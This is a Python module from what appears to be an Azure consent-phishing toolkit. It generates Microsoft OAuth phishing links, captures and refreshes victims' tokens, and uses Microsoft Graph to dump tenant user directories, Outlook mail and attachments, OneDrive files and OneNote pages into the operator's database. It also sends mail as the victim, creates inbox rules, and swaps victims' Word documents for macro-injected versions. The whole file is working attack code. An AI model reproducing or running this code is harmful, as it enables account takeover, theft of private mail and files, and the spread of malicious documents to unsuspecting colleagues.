

from concurrent.futures import thread
from datetime import date
import adal, json, time, requests, os, threading, sys
from flask_login import current_user
from sqlalchemy.log import echo_property
from sqlalchemy.sql.expression import false, true
from vajra import db
from vajra.models import StealerConfig
import urllib, base64, hashlib
from vajra.models import *
from vajra.models import Token
from hurry.filesize import size
from sqlalchemy.sql import text
from subprocess import Popen

class stealing():
        
    def createPhishLink(CLIENTID, REDIRECTURL):
        params = urllib.parse.urlencode({'response_type': 'code',
                                            'client_id': CLIENTID,
                                            'scope': 'https://graph.microsoft.com/.default openid offline_access ',
                                            'redirect_uri': REDIRECTURL,
                                            'response_mode': 'query'})
        return 'https://login.microsoftonline.com/common/oauth2/authorize?' + params

    def getPhishLink(uuid):
        config = StealerConfig.query.filter_by(uuid=uuid).all()
        if config != []:
            url =  config[-1].phishUrl
            return url    

        else:
            return False


    def getNewAccessToken(refresh_token, client_id, client_secret):        
        auth_context = adal.AuthenticationContext('https://login.microsoftonline.com/common', api_version=None)
        response = auth_context.acquire_token_with_refresh_token(refresh_token, client_id, 'https://graph.microsoft.com/', client_secret)
        
        return response

    def insertToken(uuid, tokenResponse, config):
        tokenResponse = json.loads(json.dumps(tokenResponse))
        username = tokenResponse['userId']
        refreshToken = tokenResponse['refreshToken']
        if  Token.query.filter_by(username=username, uuid=uuid).all() == []:
            insert = Token(uuid=uuid, username=username, refreshtoken=refreshToken, clientId=config.CLIENTID, clientSecret=config.CLIENTSECRET, redirectUrl=config.REDIRECTURL)
            backupToken.query.filter_by(username = username, uuid=uuid).delete()
            db.session.commit()
            backup_insert = backupToken(uuid=uuid, username=username, refreshtoken=refreshToken, clientId=config.CLIENTID, clientSecret=config.CLIENTSECRET, redirectUrl=config.REDIRECTURL)
            db.session.add(insert)
            db.session.add(backup_insert)
        else:
            token = Token.query.filter_by(uuid=uuid, username=username).first()
            token.refreshtoken = refreshToken
            token.clientId = config.CLIENTID
            token.clientSecret = config.CLIENTSECRET
            token.redirectUrl = config.REDIRECTURL

        db.session.commit()


    def getTokensFromDb(uuid, username):
        class getValues():
            get = Token.query.filter_by(uuid=uuid, username=username).first()
            refresh_token = get.refreshtoken
            client_id = get.clientId
            client_secret = get.clientSecret

        return getValues 

    def getTokens(code, config):
        try:
            auth_context = adal.AuthenticationContext('https://login.microsoftonline.com/common', api_version=None)
            response = auth_context.acquire_token_with_authorization_code(code, config.REDIRECTURL, 'https://graph.microsoft.com/', config.CLIENTID, config.CLIENTSECRET)
            return response

        except Exception as e:
            print(e)    



    def apiCall(uuid, url, method, contentType, data, accessToken):
        admin = Admin.query.filter_by(id=uuid).first()
        admin.azureUsage = admin.azureUsage + 1
        db.session.commit()
        delay = StealerConfig.query.filter_by(uuid=uuid).first()
        if delay == None:
            delay = 0
        elif delay.delay == "":
            delay = 0
        else:
            delay = int(delay.delay)
        headers = {"Authorization": "Bearer " + accessToken,
                    "Content-Type": contentType}
        url = "https://graph.microsoft.com/v1.0" + url
        time.sleep(delay)
        if method == "GET":
            req = requests.get(url, headers=headers)
            return  req
        elif method == "POST":
            req = requests.post(url, headers=headers, data = data)
            return req
        elif method == "PUT":
            req = requests.put(url, headers=headers, data = data)
            return req
        elif method == "PATCH":
            req = requests.patch(url, headers=headers, data = data)
            return req            
        elif method == "DELETE":
            req = requests.delete(url, headers=headers)
            return  req
    
    def victimprofile(uuid, accessToken):
        response = stealing.apiCall(uuid, "/me", 'GET', None, "", accessToken).json()
        profile = response['userPrincipalName']
        log = f'<br><span style="color:yellow">[+] {profile} incoming!</span>'
        db.session.add(phishingLogs(uuid=uuid, message=log))
        db.session.commit()

    def listusers(uuid, accessToken, username):
        response = stealing.apiCall(uuid, "/users?$top=999", 'GET', None, "", accessToken)
        if response.status_code == 403:
            log = ('<br><span style="color:yellow">[!] Victim\'s token doesn\'t have permission to list users!</span>')
            db.session.add(phishingLogs(uuid=uuid, message=log))
            db.session.commit()
            return
        
        db.session.query(Allusers).filter_by(uuid=uuid, username=username).delete()
        db.session.commit()

        response = response.json()

        for data in response["value"]:
            try:
                displayName       = data['displayName']
                givenName         = data['givenName']
                jobTitle          = data['jobTitle']
                mail              = data['mail']
                mobilePhone       = data['mobilePhone']
                officeLocation    = data['officeLocation']
                preferredLanguage = data['preferredLanguage']
                surname           = data['surname']
                userPrincipalName = data['userPrincipalName']
                Id                = data['id']

                insertColleagues = Allusers(uuid=uuid,
                                username=username,
                                id=Id, 
                                displayName=displayName,
                                givenName=givenName,
                                jobTitle=jobTitle,
                                mail=mail, 
                                mobilePhone=mobilePhone,
                                officeLocation=officeLocation,
                                preferredLanguage=preferredLanguage,
                                surname=surname,
                                userPrincipalName=userPrincipalName
                                )
                try:
                    db.session.add(insertColleagues)
                    db.session.commit()
                except Exception as e:
                    print(e)
                    db.session.rollback()
                    pass    
            except Exception as e:
                print(e)
                log = ('<span style="color:red">[-] listusers:'+str(e)+' </span>')
                db.session.add(phishingLogs(uuid=uuid, message=log))
                db.session.commit()
                
        
        log = ('<br><span style="color:#7FFFD4">[+] All user\'s in tenant saved!</span>')
        db.session.add(phishingLogs(uuid=uuid, message=log))
        db.session.commit()


    def attachments(uuid, Id, receiver, From, HasAttachments, date, accessToken):
        try:
            receiver = str(receiver[0]['emailAddress']['address'])
        except:
            receiver = ""
        if HasAttachments == "True":
            uri = "/me/mailfolders/inbox/messages/" + Id + "/attachments"
            response = stealing.apiCall(uuid, uri, "GET", None, "", accessToken).json()
            for data in response["value"]:
                try:
                    attachment_name  = data['name']
                    content_base64   = data['contentBytes']
                    content_raw      = data['contentBytes']
                    fileSize = str(size(len(base64.b64decode(content_raw)))) + str("B")
                    signature = hashlib.sha256(content_base64.encode('utf-8')).hexdigest()
                    insertAttachments = Attachments(uuid=uuid,id=Id, 
                                                    receiver=receiver,
                                                    sender = From,
                                                    data=str(content_base64),
                                                    filename= str(attachment_name),
                                                    size = fileSize,
                                                    date = date,
                                                    sig = str(signature)
                                                    )
                    db.session.add(insertAttachments)
                    
                    log = ('<br><span style="color:#7FFFD4">'+str(attachment_name)+'</span>')
                    db.session.add(phishingLogs(uuid=uuid, message=log))

                except Exception as e:
                    print(e) 
                    log = ('<br><span style="color:red">[-] Attachments: '+str(e)+'</span>')
                    db.session.add(phishingLogs(uuid=uuid, message=log))
                    db.session.commit()
            try:
                db.session.commit()
            except Exception as e:
                db.session.rollback()
                print(e)


    def outlook(uuid, accessToken, victim, endpoint):
        response = stealing.apiCall(uuid, endpoint, "GET", None, "", accessToken)
        if response.status_code != 200:
            log = (f'<br><span style="color:red">[-] Outlook: {response.json()}</span>')
            db.session.add(phishingLogs(uuid=uuid, message=log))
            db.session.commit()
            return
        response = response.json()
        log = ('<br><span style="color:yellow">[!] Retrieving Attachments!</span>')
        db.session.add(phishingLogs(uuid=uuid, message=log))
        db.session.query(Outlook).filter_by(uuid=uuid, username=victim).delete()
        db.session.query(Attachments).filter_by(uuid=uuid, receiver=victim).delete()
        db.session.commit()
        for data in response["value"]:
            try:
                Body           = str(data['body']['content'])
                bodyPreview    = str(data['bodyPreview'])
                From           = str(data['from']['emailAddress']['address'])
                ToRecipients   = (data['toRecipients'])
                CcRecipients   = str(data['ccRecipients'])
                BccRecipients  = str(data['bccRecipients'])
                ReplyTo        = str(data['replyTo'])
                sentDateTime   = str(data['sentDateTime'])
                Subject        = str(data['subject'])
                Flag           = str(data['flag']['flagStatus'])
                HasAttachments = str(data['hasAttachments'])
                Id             = str(data['id'])
                try:
                    Recipients = str(ToRecipients[0]['emailAddress']['address'])
                except:
                    Recipients = ""  
                insertMails = Outlook(uuid=uuid,
                                        id=Id,
                                        username=Recipients,
                                        victim= victim,
                                        Body = Body,
                                        bodyPreview= bodyPreview,
                                        Sender = From,
                                        ToRecipients = str(ToRecipients),
                                        BccRecipients = BccRecipients,
                                        CcRecipients = CcRecipients,
                                        ReplyTo = ReplyTo,
                                        Subject = Subject,
                                        Flag = Flag,
                                        HasAttachments = HasAttachments,
                                        date = sentDateTime
                                        )
                db.session.add(insertMails)
                
                stealing.attachments(uuid, Id, ToRecipients, From, HasAttachments, sentDateTime, accessToken)
                
            except Exception as e:
                # LOGGING
                print(e, Id)
                log = ('<br><span style="color:red">[-] Outlook: '+str(e)+'</span>')
                db.session.add(phishingLogs(uuid=uuid, message=log))
                db.session.commit()
                return
        try:
            db.session.commit()
        except Exception as e:
            db.session.rollback()
            print("outlook " + str(e))

        if "@odata.nextLink" in response:
            endpoint = response["@odata.nextLink"].split("/v1.0")[1]
            stealing.outlook(uuid, accessToken, victim, endpoint)

        log = ('<br><span style="color:#7FFFD4">[+] Outlook Done</span>')    
        db.session.add(phishingLogs(uuid=uuid, message=log))
        db.session.commit()
        


    def downloadOndriveFiles(uuid, item, config, victim, accessToken):
        try:
            url = item['@microsoft.graph.downloadUrl']
            name = item['name']
            date =item['createdDateTime']
            itemId = str(item['id'])
            filename , extension = os.path.splitext(name)
            extension = extension.replace(".", '')

            if extension in config.extension or config.extension == "*" or config.extension == "":
                log = ('<br><span style="color:#7FFFD4">[+] '+str(name)+'</span>')
                db.session.add(phishingLogs(uuid=uuid, message=log))
                
                content = requests.get(url, allow_redirects=True).content
                filesize = str(size(len(content))) + str("B")
                content_base64 = str(base64.b64encode(content).decode('ascii'))
                
                signature = hashlib.sha256(content_base64.encode('utf-8')).hexdigest()
                insertoneDrive = OneDrive(uuid=uuid,
                                    id=itemId,
                                    username=str(victim),
                                    data=str(content_base64),
                                    filename=str(name),
                                    date = str(date),
                                    fileSize=filesize,
                                    signature=str(signature))
                try:
                    db.session.add(insertoneDrive)
                    db.session.commit()
                except Exception as e:
                    db.session.rollback()
                    pass

                if config.macroInjection == "checked":
                    if extension == "docx":
                        try:
                            Popen(["taskkill", "/IM", "winword.exe", "/F" ])
                        except:
                            pass
                        from vajra.functions import createmacrosDoc
                        path = os.path.dirname(os.path.realpath(__file__)) + "\\tmp\\"
                        open(path + name, 'wb').write(content)
                        content = createmacrosDoc(name, path)
                        if content != false:
                            name = name.replace(".docx",".doc")
                            jsonBody = '{ "name": "%s" }' % name
                            time.sleep(config.delay)
                            response = stealing.apiCall(uuid, "/me/drive/items/"+itemId, 'PATCH', "application/json", jsonBody, accessToken)    
                            if response.status_code != 200:
                                log = ('<br><span style="color:red">[-] File not renamed!</span>') 
                                db.session.add(phishingLogs(uuid=uuid, message=log))
                                db.session.commit()
                                return "File not renamed!"

                            with open(path + name, 'rb') as content:
                                time.sleep(config.delay)
                                content_type = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
                                response = stealing.apiCall(uuid, "/me/drive/items/"+ itemId +"/content", 'PUT', content_type, content, accessToken) 

                            if response.status_code == 200:
                                return true
                            else:
                                return false

        except Exception as e:
            if "list index out of range" in str(e) or "@microsoft.graph.downloadUrl" in str(e):
                return
            log = ('<br><span style="color:red">[-] OneDrive: '+str(e)+'</span>') 
            db.session.add(phishingLogs(uuid=uuid, message=log))
            db.session.commit()



    def oneDrive(uuid, accessToken, victim, config):
        response = stealing.apiCall(uuid, "/me/drive/root/children", "GET", None, "", accessToken).json()
        try:
            response['value'][0]['id']
        except:
            log = ('<br><span style="color:red">[!] OneDrive is Empty or accessToken has no rights on it!</span>') 
            db.session.add(phishingLogs(uuid=uuid, message=log))
            db.session.commit()
            return
        log = ('<br><span style="color:yellow">[!] Retrieving OneDrive Files!</span>')
        db.session.add(phishingLogs(uuid=uuid, message=log))
        db.session.query(OneDrive).filter_by(uuid=uuid, username=victim).delete()
        db.session.commit()

        for item in response['value']:
            
            if "folder" in item:
                folder = item["name"]
                
                response = stealing.apiCall(uuid, "/me/drive/root/children/"+folder+"/children", "GET", None, "", accessToken).json()
                
                try:
                    for item in response['value']:
                        log = ('<br><span style="color:#7FFFD4">[+] '+item['name']+'</span>')
                        db.session.add(phishingLogs(uuid=uuid, message=log))
                        db.session.commit()
                        threading.Thread(target=stealing.downloadOndriveFiles, name="Service Principle", args=(uuid, item, config, victim, accessToken)).start()

                except Exception as e:
                    log = ('<br><span style="color:red">[-] OneDrive: '+str(e)+'</span>') 
                    db.session.add(phishingLogs(uuid=uuid, message=log))
                    db.session.commit()
                    
            
            threading.Thread(target=stealing.downloadOndriveFiles, name="Service Principle", args=(uuid, item, config, victim, accessToken)).start()
            
        log = ('<br><span style="color:#7FFFD4">[+] OneDrive: Done</span>') 
        db.session.add(phishingLogs(uuid=uuid, message=log))
        db.session.commit()

    def oneNote(uuid, accessToken, victim, config):
        
        response = stealing.apiCall(uuid, "/me/onenote/pages/", "GET", None, "", accessToken)
        if response.status_code == 401:
            log = ('<br><span style="color:red">[-] Access token doesn\'t have access for OneNote</span>')
            db.session.add(phishingLogs(uuid=uuid, message=log))
            db.session.commit()
            return
        response = response.json()
        try:
            response['value'][0]['contentUrl']
        except:
            log = ('<br><span style="color:red">[-] OneNote is Empty or accessToken has no rights on it!</span>') 
            db.session.add(phishingLogs(uuid=uuid, message=log))
            db.session.commit()
            return
        log = ('<br><span style="color:yellow">[+] Retrieving OneNote Files! </span>')
        db.session.add(phishingLogs(uuid=uuid, message=log))
        db.session.query(OneNote).filter_by(uuid=uuid, username=victim).delete()
        db.session.commit()
        for data in response["value"]:
            try:
                time.sleep(config.delay)
                id        = data['id']
                url       = data['contentUrl']
                content   = requests.get(url, headers={"Authorization":"Bearer "+accessToken}).text
                filename  = data['title'] + '.html'
                date      = data['createdDateTime']
                signature = hashlib.sha256(content.encode('utf-8')).hexdigest()
                filesize = str(size(len(date))) + str("B")

                oneNote = OneNote(uuid=uuid, id=str(id), username=str(victim), data=str(content), filename=str(filename), date = str(date), fileSize=filesize, signature=str(signature))
             
                try:
                    db.session.add(oneNote)
                    db.session.commit()
                except Exception as e:
                    db.session.rollback()
                    #print("OneDrive " + str(e))

                log = ('<br><span style="color:#7FFFD4">[+] '+filename+' Downloaded!</span>')
                db.session.add(phishingLogs(uuid=uuid, message=log))
                db.session.commit()

            except Exception as e:
                exc_type, exc_obj, exc_tb = sys.exc_info()
                fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                print(exc_type, fname, exc_tb.tb_lineno)
                if "list index out of range" in str(e):
                    break
                log = ('<br><span style="color:red">[-] OneNote: '+str(e)+'</span>') 
                db.session.add(phishingLogs(uuid=uuid, message=log))
                db.session.commit()

        log = ('<br><span style="color:#7FFFD4">[+] OneNote Done</span>')
        db.session.add(phishingLogs(uuid=uuid, message=log))
        db.session.commit()

class stealerAction():

    def getAccessToken(uuid, username):
        fromDb = stealing.getTokensFromDb(uuid, username)              # Getting new Access_token from Tokens Table 
        tokens = stealing.getNewAccessToken(fromDb.refresh_token, fromDb.client_id, fromDb.client_secret)
        accessToken = tokens['accessToken']
        refreshToken = tokens['refreshToken']
        db.engine.execute(text("UPDATE token set refreshtoken= :refreshToken where username=:username and uuid = :uuid"),uuid=uuid, refreshToken=refreshToken, username=username)
        return accessToken

    def sendMail(uuid, sender, receiver, subject, body, attachment):
        accessToken = stealerAction.getAccessToken(uuid, sender)
        body =  body.replace("'", "\\'")
        attachment_name = attachment.filename
        content_type = attachment.content_type
        content = base64.b64encode(attachment.read()).decode("utf-8")
        jsonBody = '''
        {
          "message": {
              "subject": "%s",
              "body": {
                  "contentType": "HTML",
                  "content": "%s"
              },
              "toRecipients": [
                  {
                      "emailAddress": {
                          "address": "%s"
                      }
                  }
              ],
            "attachments": [
              {
                "@odata.type": "#microsoft.graph.fileAttachment",
                "name": "%s",
                "contentType": "%s",
                "contentBytes": "%s"
              }
            ]
          }
        }
        ''' % (subject, body, receiver, attachment_name, content_type, content)

        if attachment.filename != "":
            response = stealing.apiCall(uuid, "/me/sendMail", 'POST', "application/json", jsonBody, accessToken)
            return response

        
        jsonBody = '''
        {
            "message": {
              "subject": "%s",
              "body": {
                  "contentType": "HTML",
                  "content": "%s"
              },
              "toRecipients": [
                  {
                      "emailAddress": {
                          "address": "%s"
                      }
                  }
              ]
            }
        }
        ''' % (subject, body, receiver)
        
        
        response = stealing.apiCall(uuid, "/me/sendMail", 'POST', "application/json", jsonBody, accessToken)
        return response


    def replaceOneDriveFile(uuid, username, id, name, content):
        accessToken = stealerAction.getAccessToken(uuid, username)
        content_b64 = str(base64.b64encode(content).decode('ascii'))
        sig = hashlib.sha256(content_b64.encode('utf-8')).hexdigest()
        jsonBody = '{ "name": "%s" }' % name
        changeName = stealing.apiCall(uuid, "/me/drive/items/"+id, 'PATCH', "application/json", jsonBody, accessToken)
        
        if changeName.status_code == 200:
            db.engine.execute(text("UPDATE one_drive SET filename=:name where id=:id"), name=name, id=id) # Update Name
            content_type = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
            try:
                changeContent = stealing.apiCall(uuid, "/me/drive/items/"+ id +"/content", "PUT", content_type, content, accessToken)
                if changeContent.status_code == 200:
                    try:
                        db.engine.execute(text("UPDATE one_drive SET filename=:name, data=:content_b64, signature=:sig where id=:id and uuid= :uuid"), name=name, content=content_b64, id=id, sig=sig, uuid=uuid)
                    except Exception as e:
                        pass
                else:
                    return changeContent.json()['error']['message']
            except Exception as e:
                return "Unable to change File content!"
        else:
            return changeName.json()['error']['message']
          

    def deleteOneDriveFile(uuid, username, id):
        accessToken = stealerAction.getAccessToken(uuid, username)
        
        res = stealing.apiCall(uuid, "/me/drive/items/"+id, "DELETE", None, None, accessToken)
        if res.status_code == 204:
            db.engine.execute(text("DELETE FROM one_drive WHERE id=:id"), id=id)

            return true
        else:
            return res.json()['error']['message']

    def createOutlookRules(uuid, victim, rules):
        accessToken = stealerAction.getAccessToken(uuid, victim)
        response = stealing.apiCall(uuid, "/me/mailFolders/inbox/messageRules", "GET", None, None, accessToken).json()
        for data in response['value']:
            try:
                name = data['displayName']
                if name == json.loads(rules)['displayName']:
                    ruleId = data['id']
                    
                    stealing.apiCall(uuid, "/me/mailFolders/inbox/messageRules/"+ruleId, "DELETE", None, None, accessToken)
            except:
                break  
            
        response = stealing.apiCall(uuid, "/me/mailFolders/inbox/messageRules", "POST", "application/json", rules, accessToken)
        return response

